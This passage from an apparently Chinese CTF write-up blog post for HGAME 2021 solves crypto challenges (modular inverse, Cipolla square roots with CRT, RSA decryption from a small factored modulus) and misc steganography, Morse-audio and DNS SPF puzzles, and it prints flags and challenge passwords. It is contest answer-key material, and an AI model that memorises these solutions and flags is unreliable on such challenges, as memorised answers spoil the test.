+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#print(a)</span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#print(gcd(a,p))</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>flag <span style=color:#666>=</span> c <span style=color:#666>*</span> (exgcdRecursion(a,p)[<span style=color:#40a070>1</span>])
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#print(flag)</span>
+</span></span><span style=display:flex><span>start_it <span style=color:#666>=</span> (<span style=color:#666>-</span>flag) <span style=color:#666>//</span> p <span style=color:#666>+</span> <span style=color:#40a070>1</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>for</span> t <span style=color:#007020;font-weight:700>in</span> <span style=color:#007020>range</span>(start_it,start_it <span style=color:#666>+</span> <span style=color:#40a070>1000</span>):
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>try</span>:
+</span></span><span style=display:flex><span>        <span style=color:#007020>print</span>(<span style=color:#007020>str</span>(flag <span style=color:#666>+</span> t <span style=color:#666>*</span> p))
+</span></span><span style=display:flex><span>        flag_str <span style=color:#666>=</span> libnum<span style=color:#666>.</span>n2s(flag <span style=color:#666>+</span> t <span style=color:#666>*</span> p)
+</span></span><span style=display:flex><span>        <span style=color:#007020>print</span>(flag_str)
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>if</span>(flag_str[:<span style=color:#40a070>6</span>] <span style=color:#666>==</span> <span style=color:#4070a0>&#39;hgame{&#39;</span>):
+</span></span><span style=display:flex><span>            log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#39;t:&#39;</span> <span style=color:#666>+</span> t)
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>except</span>:
+</span></span><span style=display:flex><span>        t<span style=color:#666>=</span>t
+</span></span></code></pre></div><p><code>python</code> 的实数除精度是有限的，需要用 <code>//</code> 当时不知道，用的 <code>/</code> ，导致一直都还原不出来，浪费不少时间。</p><h3 id=gcd-or-more>gcd or more?</h3><p><code>chiper</code> 的生成方式为 <code>cipher = pow(s2n(FLAG), 2, n)</code>，简单的化简一下就是</p><p>$$
+flag^2 \equiv cipher \pmod n</p><p>$$</p><p>由于 $flag$ 一定存在，所以这是一个二次剩余问题</p><p>若$n$是奇素数，那么用 $Cipolla$ 算法可以在 $O(log_2 n)$ 的时间内解决掉。然而本题的 $n=pq$，$p$，$q$都是奇素数，所以可以先分解为二次同余方程组</p><p>$$
+flag^2 \equiv cipher \pmod n \Rightarrow \begin{cases}
+flag_1^2 \equiv chiper \pmod p\
+flag_2^2 \equiv chiper \pmod q
+\end{cases}</p><p>$$</p><p>用 $Cipolla$ 算法解出两个方程组的解，每个方程组各有两个解</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>(84812196578912497483199456102681113661036350274620044265283928278516249390960L, 416368442216404370115478480447969780952694950402497033266642170873590218059L)
+</span></span><span style=display:flex><span>(33570896975793191313496233193196351806104943487094925756639556604941759642419L, 78043817665571719999419061286654197325730434558907498221349901238129429193852L)
+</span></span></code></pre></div><p>然后两组里一对一进行 $CRT$ 合并，可以得出四个解，其中就有某个可以还原出 <code>flag</code></p><h3 id=cipolla>$Cipolla$</h3><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#Converts n to base b as a list of integers between 0 and b-1</span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#Most-significant digit on the left</span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>convertToBase</span>(n, b):
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span>(n <span style=color:#666>&lt;</span> <span style=color:#40a070>2</span>):
+</span></span><span style=display:flex><span>		<span style=color:#007020;font-weight:700>return</span> [n]
+</span></span><span style=display:flex><span>	temp <span style=color:#666>=</span> n
+</span></span><span style=display:flex><span>	ans <span style=color:#666>=</span> []
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>while</span>(temp <span style=color:#666>!=</span> <span style=color:#40a070>0</span>):
+</span></span><span style=display:flex><span>		ans <span style=color:#666>=</span> [temp <span style=color:#666>%</span> b]<span style=color:#666>+</span> ans
+</span></span><span style=display:flex><span>		temp <span style=color:#666>/=</span> b
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>return</span> ans
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#Takes integer n and odd prime p</span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#Returns both square roots of n modulo p as a pair (a,b)</span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#Returns () if no root</span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>cipolla</span>(n,p):
+</span></span><span style=display:flex><span>	n <span style=color:#666>%=</span> p
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span>(n <span style=color:#666>==</span> <span style=color:#40a070>0</span> <span style=color:#007020;font-weight:700>or</span> n <span style=color:#666>==</span> <span style=color:#40a070>1</span>):
+</span></span><span style=display:flex><span>		<span style=color:#007020;font-weight:700>return</span> (n,<span style=color:#666>-</span>n<span style=color:#666>%</span>p)
+</span></span><span style=display:flex><span>	phi <span style=color:#666>=</span> p <span style=color:#666>-</span> <span style=color:#40a070>1</span>
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span>(<span style=color:#007020>pow</span>(n, phi<span style=color:#666>/</span><span style=color:#40a070>2</span>, p) <span style=color:#666>!=</span> <span style=color:#40a070>1</span>):
+</span></span><span style=display:flex><span>		<span style=color:#007020;font-weight:700>return</span> ()
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span>(p<span style=color:#666>%</span><span style=color:#40a070>4</span> <span style=color:#666>==</span> <span style=color:#40a070>3</span>):
+</span></span><span style=display:flex><span>		ans <span style=color:#666>=</span> <span style=color:#007020>pow</span>(n,(p<span style=color:#666>+</span><span style=color:#40a070>1</span>)<span style=color:#666>/</span><span style=color:#40a070>4</span>,p)
+</span></span><span style=display:flex><span>		<span style=color:#007020;font-weight:700>return</span> (ans,<span style=color:#666>-</span>ans<span style=color:#666>%</span>p)
+</span></span><span style=display:flex><span>	aa <span style=color:#666>=</span> <span style=color:#40a070>0</span>
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>for</span> i <span style=color:#007020;font-weight:700>in</span> xrange(<span style=color:#40a070>1</span>,p):
+</span></span><span style=display:flex><span>		temp <span style=color:#666>=</span> <span style=color:#007020>pow</span>((i<span style=color:#666>*</span>i<span style=color:#666>-</span>n)<span style=color:#666>%</span>p,phi<span style=color:#666>/</span><span style=color:#40a070>2</span>,p)
+</span></span><span style=display:flex><span>		<span style=color:#007020;font-weight:700>if</span>(temp <span style=color:#666>==</span> phi):
+</span></span><span style=display:flex><span>			aa <span style=color:#666>=</span> i
+</span></span><span style=display:flex><span>			<span style=color:#007020;font-weight:700>break</span>;
+</span></span><span style=display:flex><span>	exponent <span style=color:#666>=</span> convertToBase((p<span style=color:#666>+</span><span style=color:#40a070>1</span>)<span style=color:#666>/</span><span style=color:#40a070>2</span>,<span style=color:#40a070>2</span>)
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>cipollaMult</span>((a,b),(c,d),w,p):
+</span></span><span style=display:flex><span>		<span style=color:#007020;font-weight:700>return</span> ((a<span style=color:#666>*</span>c<span style=color:#666>+</span>b<span style=color:#666>*</span>d<span style=color:#666>*</span>w)<span style=color:#666>%</span>p,(a<span style=color:#666>*</span>d<span style=color:#666>+</span>b<span style=color:#666>*</span>c)<span style=color:#666>%</span>p)
+</span></span><span style=display:flex><span>	x1 <span style=color:#666>=</span> (aa,<span style=color:#40a070>1</span>)
+</span></span><span style=display:flex><span>	x2 <span style=color:#666>=</span> cipollaMult(x1,x1,aa<span style=color:#666>*</span>aa<span style=color:#666>-</span>n,p)
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>for</span> i <span style=color:#007020;font-weight:700>in</span> xrange(<span style=color:#40a070>1</span>,<span style=color:#007020>len</span>(exponent)):
+</span></span><span style=display:flex><span>		<span style=color:#007020;font-weight:700>if</span>(exponent[i] <span style=color:#666>==</span> <span style=color:#40a070>0</span>):
+</span></span><span style=display:flex><span>			x2 <span style=color:#666>=</span> cipollaMult(x2,x1,aa<span style=color:#666>*</span>aa<span style=color:#666>-</span>n,p)
+</span></span><span style=display:flex><span>			x1 <span style=color:#666>=</span> cipollaMult(x1,x1,aa<span style=color:#666>*</span>aa<span style=color:#666>-</span>n,p)
+</span></span><span style=display:flex><span>		<span style=color:#007020;font-weight:700>else</span>:
+</span></span><span style=display:flex><span>			x1 <span style=color:#666>=</span> cipollaMult(x1,x2,aa<span style=color:#666>*</span>aa<span style=color:#666>-</span>n,p)
+</span></span><span style=display:flex><span>			x2 <span style=color:#666>=</span> cipollaMult(x2,x2,aa<span style=color:#666>*</span>aa<span style=color:#666>-</span>n,p)
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>return</span> (x1[<span style=color:#40a070>0</span>],<span style=color:#666>-</span>x1[<span style=color:#40a070>0</span>]<span style=color:#666>%</span>p)
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span>n <span style=color:#666>=</span> long(<span style=color:#007020>input</span>())
+</span></span><span style=display:flex><span>p <span style=color:#666>=</span> long(<span style=color:#007020>input</span>())
+</span></span><span style=display:flex><span><span style=color:#007020>print</span> cipolla(n,p)
+</span></span></code></pre></div><h4 id=excrt>$exCRT$</h4><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#!/usr/bin/env python</span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># coding=utf-8</span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>from</span> <span style=color:#0e84b5;font-weight:700>functools</span> <span style=color:#007020;font-weight:700>import</span> reduce
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>gcd</span>(a, b):
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> b<span style=color:#666>==</span><span style=color:#40a070>0</span>: <span style=color:#007020;font-weight:700>return</span> a
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>return</span> gcd(b, a<span style=color:#666>%</span>b)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>lcm</span>(a, b):
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>return</span> a <span style=color:#666>*</span> b <span style=color:#666>//</span> gcd(a,b)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>exgcd</span>(a, b):
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> b<span style=color:#666>==</span><span style=color:#40a070>0</span>: <span style=color:#007020;font-weight:700>return</span> <span style=color:#40a070>1</span>, <span style=color:#40a070>0</span>
+</span></span><span style=display:flex><span>    x, y <span style=color:#666>=</span> exgcd(b, a<span style=color:#666>%</span>b)
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>return</span> y, x <span style=color:#666>-</span> a<span style=color:#666>//</span>b<span style=color:#666>*</span>y
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>uni</span>(P, Q):
+</span></span><span style=display:flex><span>    r1, m1 <span style=color:#666>=</span> P
+</span></span><span style=display:flex><span>    r2, m2 <span style=color:#666>=</span> Q
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    d <span style=color:#666>=</span> gcd(m1, m2)
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>assert</span> (r2<span style=color:#666>-</span>r1) <span style=color:#666>%</span> d <span style=color:#666>==</span> <span style=color:#40a070>0</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    l1, l2 <span style=color:#666>=</span> exgcd(m1<span style=color:#666>//</span>d, m2<span style=color:#666>//</span>d)
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>return</span> (r1 <span style=color:#666>+</span> (r2<span style=color:#666>-</span>r1)<span style=color:#666>//</span>d<span style=color:#666>*</span>l1<span style=color:#666>*</span>m1) <span style=color:#666>%</span> lcm(m1, m2), lcm(m1, m2)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>CRT</span>(eq):
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>return</span> reduce(uni, eq)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>if</span> __name__ <span style=color:#666>==</span> <span style=color:#4070a0>&#34;__main__&#34;</span>:
+</span></span><span style=display:flex><span>    n <span style=color:#666>=</span> <span style=color:#007020>int</span>(<span style=color:#007020>input</span>())
+</span></span><span style=display:flex><span>    eq <span style=color:#666>=</span> [<span style=color:#007020>list</span>(<span style=color:#007020>map</span>(<span style=color:#007020>int</span>, <span style=color:#007020>input</span>()<span style=color:#666>.</span>strip()<span style=color:#666>.</span>split()))[::<span style=color:#666>-</span><span style=color:#40a070>1</span>] <span style=color:#007020;font-weight:700>for</span> x <span style=color:#007020;font-weight:700>in</span> <span style=color:#007020>range</span>(n)]
+</span></span><span style=display:flex><span>    <span style=color:#007020>print</span>(CRT(eq)[<span style=color:#40a070>0</span>])
+</span></span></code></pre></div><p>当然完全没有必要用 $exCRT$ 合并，毕竟$p$,$q$都是质数，但是有找到这个板子就免得我手打 $CRT$ 了。</p><p>最后合并出来并转成字符串就得到了 flag：<code>hgame{3xgCd~i5_re4l1y+e@sy^r1ght?}</code></p><h3 id=whitegiversa>WhitegiveRSA</h3><p>给了公钥和密文，看 <code>N</code> 不甚大，随便找个网站分解一下得</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>p = 1029224947942998075080348647219
+</span></span><span style=display:flex><span>q = 857504083339712752489993810777
+</span></span></code></pre></div><p>然后就是要求 <code>d</code> 了，即求$d$令$ed \equiv 1 \ \pmod{r}$（$r = pq$），这个一看就是个扩欧，曾经打过 OI，这个东西当时也是会写的，但是现在我看到算法就头疼，所以就随便找了个板子跑了一下</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># coding = utf-8</span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>computeD</span>(fn, e):
+</span></span><span style=display:flex><span>    (x, y, r) <span style=color:#666>=</span> extendedGCD(fn, e)
+</span></span><span style=display:flex><span>    <span style=color:#60a0b0;font-style:italic>#y maybe &lt; 0, so convert it</span>
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> y <span style=color:#666>&lt;</span> <span style=color:#40a070>0</span>:
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>return</span> fn <span style=color:#666>+</span> y
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>return</span> y
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>extendedGCD</span>(a, b):
+</span></span><span style=display:flex><span>    <span style=color:#60a0b0;font-style:italic>#a*xi + b*yi = ri</span>
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> b <span style=color:#666>==</span> <span style=color:#40a070>0</span>:
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>return</span> (<span style=color:#40a070>1</span>, <span style=color:#40a070>0</span>, a)
+</span></span><span style=display:flex><span>    <span style=color:#60a0b0;font-style:italic>#a*x1 + b*y1 = a</span>
+</span></span><span style=display:flex><span>    x1 <span style=color:#666>=</span> <span style=color:#40a070>1</span>
+</span></span><span style=display:flex><span>    y1 <span style=color:#666>=</span> <span style=color:#40a070>0</span>
+</span></span><span style=display:flex><span>    <span style=color:#60a0b0;font-style:italic>#a*x2 + b*y2 = b</span>
+</span></span><span style=display:flex><span>    x2 <span style=color:#666>=</span> <span style=color:#40a070>0</span>
+</span></span><span style=display:flex><span>    y2 <span style=color:#666>=</span> <span style=color:#40a070>1</span>
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>while</span> b <span style=color:#666>!=</span> <span style=color:#40a070>0</span>:
+</span></span><span style=display:flex><span>        q <span style=color:#666>=</span> a <span style=color:#666>/</span> b
+</span></span><span style=display:flex><span>        <span style=color:#60a0b0;font-style:italic>#ri = r(i-2) % r(i-1)</span>
+</span></span><span style=display:flex><span>        r <span style=color:#666>=</span> a <span style=color:#666>%</span> b
+</span></span><span style=display:flex><span>        a <span style=color:#666>=</span> b
+</span></span><span style=display:flex><span>        b <span style=color:#666>=</span> r
+</span></span><span style=display:flex><span>        <span style=color:#60a0b0;font-style:italic>#xi = x(i-2) - q*x(i-1)</span>
+</span></span><span style=display:flex><span>        x <span style=color:#666>=</span> x1 <span style=color:#666>-</span> q<span style=color:#666>*</span>x2
+</span></span><span style=display:flex><span>        x1 <span style=color:#666>=</span> x2
+</span></span><span style=display:flex><span>        x2 <span style=color:#666>=</span> x
+</span></span><span style=display:flex><span>        <span style=color:#60a0b0;font-style:italic>#yi = y(i-2) - q*y(i-1)</span>
+</span></span><span style=display:flex><span>        y <span style=color:#666>=</span> y1 <span style=color:#666>-</span> q<span style=color:#666>*</span>y2
+</span></span><span style=display:flex><span>        y1 <span style=color:#666>=</span> y2
+</span></span><span style=display:flex><span>        y2 <span style=color:#666>=</span> y
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>return</span>(x1, y1, a)
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span>p <span style=color:#666>=</span> <span style=color:#40a070>1029224947942998075080348647219</span>
+</span></span><span style=display:flex><span>q <span style=color:#666>=</span> <span style=color:#40a070>857504083339712752489993810777</span>
+</span></span><span style=display:flex><span>e <span style=color:#666>=</span> <span style=color:#40a070>65537</span>
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span>n <span style=color:#666>=</span> p <span style=color:#666>*</span> q
+</span></span><span style=display:flex><span>fn <span style=color:#666>=</span> (p <span style=color:#666>-</span> <span style=color:#40a070>1</span>) <span style=color:#666>*</span> (q <span style=color:#666>-</span> <span style=color:#40a070>1</span>)
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span>d <span style=color:#666>=</span> computeD(fn, e)
+</span></span><span style=display:flex><span><span style=color:#007020>print</span>(<span style=color:#007020>str</span>(d))
+</span></span></code></pre></div><p>解出 <code>d = 121832886702415731577073962957377780195510499965398469843281</code>，然后考虑解密，这个时候我发现了 <code>RSA Tool 2 by tE</code> 这个工具，意识到之前的工作白做了</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/02/83355765.png></div><p>直接获得flag</p><h2 id=misc>MISC</h2><p>感觉都是脑洞题，看来需要多玩玩解密游戏练练脑子</p><h3 id=tools>Tools</h3><p>第一步用 <code>F5-steganography</code> 解密图片，密码为备注中的 <code>!LyJJ9bi&amp;M7E72*JyD</code>，获得压缩包密码 <code>e@317S*p1A4bIYIs1M</code>，解压压缩包</p><p>第二步用 <code>Steghide</code> 解密，密码仍然在备注中，解密得 <code>u0!FO4JUhl5!L55%$&</code></p><p>第三步用 <code>outguess</code>，这个东西好像只能自己编译安装，我在编译的时候爆了一堆 <code>warning</code>，但是好想还是可以用，得密码 <code>@UjXL93044V5zl2ZKI</code></p><p>第四步用 <code>JPHS</code>，充满年代感的程序，获得密码 <code>xSRejK1^Z1Cp9M!z@H</code></p><p>最后得到四张二维码碎片，合起来一扫，获得flag：<code>hgame{Taowa_is_N0T_g00d_but_T001s_is_Useful}</code></p><h3 id=telegraph1601-6639-3459-3134-0892>Telegraph：1601 6639 3459 3134 0892</h3><p>拿到音频，听了一下，前面很正常，1分10秒左右开始出现电报的声音，2分30秒左右又有明显的噤声，猜测是频谱隐写，拖到AU中一看</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/02/2101795753.png></div><p>果然，写了一个大大的850Hz，一看1分10秒850Hz处</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/02/1822596688.png></div><p>的确有长短码，读出来是<code>-.-- --- ..- .-. ..-. .-.. .- --. .. ... ....- --. ----- ----- -.. ... ----- -. --. -... ..- - -. ----- - ....- --. ----- ----- -.. -- .- -. ----- ...-- ----. ...-- .---- ----- -.- ..</code>，随便找个网站翻译一下</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/02/2809300119.png></div><p>得 <code>YOURFLAGIS4G00DS0NGBUTN0T4G00DMAN039310KI</code>，所以flag为 <code>hgame{4G00DS0NGBUTN0T4G00DMAN039310KI}</code>，读错了许多次，眼睛都看花了。</p><h3 id=hallucigenia>Hallucigenia</h3><p>这个奇怪的生物令人不适</p><p>看到 <code>png</code>，先 <code>stegsolve</code> 里面看一下，上周的题目是改高度，当时直接改过了，就没解出来，这次不用改高度，直接看就可以了</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/02/2282792523.png></div><p>二维码扫出来是</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>gmBCrkRORUkAAAAA+jrgsWajaq0BeC3IQhCEIQhCKZw1MxTzSlNKnmJpivW9IHVPrTjvkkuI3sP7bWAEdIHWCbDsGsRkZ9IUJC9AhfZFbpqrmZBtI+ZvptWC/KCPrL0gFeRPOcI2WyqjndfUWlNj+dgWpe1qSTEcdurXzMRAc5EihsEflmIN8RzuguWq61JWRQpSI51/KHHT/6/ztPZJ33SSKbieTa1C5koONbLcf9aYmsVh7RW6p3SpASnUSb3JuSvpUBKxscbyBjiOpOTq8jcdRsx5/IndXw3VgJV6iO1+6jl4gjVpWouViO6ih9ZmybSPkhaqyNUxVXpV5cYU+Xx5sQTfKystDLipmqaMhxIcgvplLqF/LWZzIS5PvwbqOvrSlNHVEYchCEIQISICSZJijwu50rRQHDyUpaF0y///p6FEDCCDFsuW7YFoVEFEST0BAACLgLOrAAAAAggUAAAAtAAAAFJESEkNAAAAChoKDUdOUIk=
+</span></span></code></pre></div><p>看到等号，估计是 <code>base64</code>，解压一下发现是乱码，但是末尾有 <code>png</code> 的魔数，联想到题干的颠倒，估计这实际上是个 <code>png</code>，简单写个脚本逆一下</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#!/usr/bin/env python</span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># coding=utf-8</span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>import</span> <span style=color:#0e84b5;font-weight:700>base64</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>s <span style=color:#666>=</span> <span style=color:#4070a0>&#39;gmBCrkRORUkAAAAA+jrgsWajaq0BeC3IQhCEIQhCKZw1MxTzSlNKnmJpivW9IHVPrTjvkkuI3sP7bWAEdIHWCbDsGsRkZ9IUJC9AhfZFbpqrmZBtI+ZvptWC/KCPrL0gFeRPOcI2WyqjndfUWlNj+dgWpe1qSTEcdurXzMRAc5EihsEflmIN8RzuguWq61JWRQpSI51/KHHT/6/ztPZJ33SSKbieTa1C5koONbLcf9aYmsVh7RW6p3SpASnUSb3JuSvpUBKxscbyBjiOpOTq8jcdRsx5/IndXw3VgJV6iO1+6jl4gjVpWouViO6ih9ZmybSPkhaqyNUxVXpV5cYU+Xx5sQTfKystDLipmqaMhxIcgvplLqF/LWZzIS5PvwbqOvrSlNHVEYchCEIQISICSZJijwu50rRQHDyUpaF0y///p6FEDCCDFsuW7YFoVEFEST0BAACLgLOrAAAAAggUAAAAtAAAAFJESEkNAAAAChoKDUdOUIk=&#39;</span>
+</span></span><span style=display:flex><span>de <span style=color:#666>=</span> base64<span style=color:#666>.</span>b64decode(s)
+</span></span><span style=display:flex><span><span style=color:#007020>print</span> de[::<span style=color:#666>-</span><span style=color:#40a070>1</span>]
+</span></span></code></pre></div><p>然后获得一个png</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/02/1523295642.png></div><p>直接看看不懂，借助在线工具翻转（Google png 水平翻转 第一个）</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/02/449965173.png></div><p>获得flag</p><h3 id=dns>DNS</h3><p>这道题又是给了一个 <code>pcapng</code>，里面不断出现 <code>https://flag.hgame2021.cf/</code> 这个域名，考虑登进去看看，发现一直有弹窗，就把js禁用掉了，网站源码为</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>&lt;html&gt;
+</span></span><span style=display:flex><span>&lt;head&gt;
+</span></span><span style=display:flex><span>&lt;/head&gt;
+</span></span><span style=display:flex><span>&lt;body&gt;
+</span></span><span style=display:flex><span>&lt;script&gt;
+</span></span><span style=display:flex><span>            while(true){
+</span></span><span style=display:flex><span>                alert(&#34;Flag is here but not here&#34;)
+</span></span><span style=display:flex><span>            }
+</span></span><span style=display:flex><span>        &lt;/script&gt;
+</span></span><span style=display:flex><span>&lt;b&gt;Do you know SPF?&lt;/b&gt;
+</span></span><span style=display:flex><span>&lt;/body&gt;
+</span></span><span style=display:flex><span>&lt;/html&gt;
+</span></span></code></pre></div><p>SPF是啥？谷歌一下有说是防晒霜的，估计和题目没关系，应该是<strong>发件人策略框架</strong>吧，引用Wiki：</p><blockquote><p><strong>发件人策略框架</strong>（英语：<strong>Sender Policy Framework</strong>；简称<strong>SPF</strong>； <a href=https://tools.ietf.org/html/rfc4408>RFC 4408</a>）是一套<a href=https://zh.wikipedia.org/wiki/%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6 title=电子邮件>电子邮件</a>认证机制，可以确认电子邮件确实是由网域授权的邮件服务器寄出，防止有人伪冒身份<a href=https://zh.wikipedia.org/wiki/%E7%B6%B2%E7%B5%A1%E9%87%A3%E9%AD%9A title=网络钓鱼>网络钓鱼</a>或寄出<a href=https://zh.wikipedia.org/wiki/%E5%9E%83%E5%9C%BE%E9%9B%BB%E9%83%B5 title=垃圾电邮>垃圾电邮</a>。SPF允许管理员设定一个<a href=https://zh.wikipedia.org/wiki/%E5%9F%9F%E5%90%8D%E7%B3%BB%E7%BB%9F title=域名系统>DNS</a> <a href=https://zh.wikipedia.org/wiki/%E5%9F%9F%E5%90%8D%E6%9C%8D%E5%8B%99%E5%99%A8%E8%A8%98%E9%8C%84%E9%A1%9E%E5%9E%8B%E5%88%97%E8%A1%A8 title=域名服务器记录类型列表>TXT记录</a>或<a href=https://zh.wikipedia.org/wiki/%E5%9F%9F%E5%90%8D%E6%9C%8D%E5%8B%99%E5%99%A8%E8%A8%98%E9%8C%84%E9%A1%9E%E5%9E%8B%E5%88%97%E8%A1%A8>SPF记录</a>设定发送邮件服务器的IP范围，如有任何邮件并非从上述指明授权的IP地址寄出，则很可能该邮件并非确实由真正的寄件者寄出（邮件上声称的“寄件者”为假冒）。<a href=https://zh.wikipedia.org/wiki/%E5%8F%91%E4%BB%B6%E4%BA%BA%E7%AD%96%E7%95%A5%E6%A1%86%E6%9E%B6#cite_note-1>[1]</a></p></blockquote><p>这个东西其实就是 DNS 服务器的一个记录，如果一个网站要向用户发送邮件，这个记录就可以证明该邮件是该网站管理员发送的。那么既然是存在 DNS 服务器里面的，我们就可以看一下。据说 <code>nslookup</code> 可以用，但是我好像不会，顺着<a href=http://www.5dmail.net/html/2013-12-23/20131223112341.htm>这个网站</a>找到了<a href=https://www.kitterman.com/spf/validate.html>这个网站</a>（二者都充满年代感），最后 flag 就藏在记录里</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/02/3229590950.png></div></section><div class=post-tags><nav class="nav tags"><ul class=tags><li><a href=/tags/write-up>write-up</a></li><li><a href=/tags/hctf-game>hctf-game</a></li></ul></nav></div></article></main><footer><div style=display:flex><a class=soc href=https://github.com/chujDK rel=me title=GitHub><i data-feather=github></i></a>
+<a class=border></a></div><div class=footer-info>2023 <a href=https://github.com/athul/archie>Archie Theme</a> | Built with <a href=https://gohugo.io>Hugo</a></div></footer><script>feather.replace()</script></div></body></html>
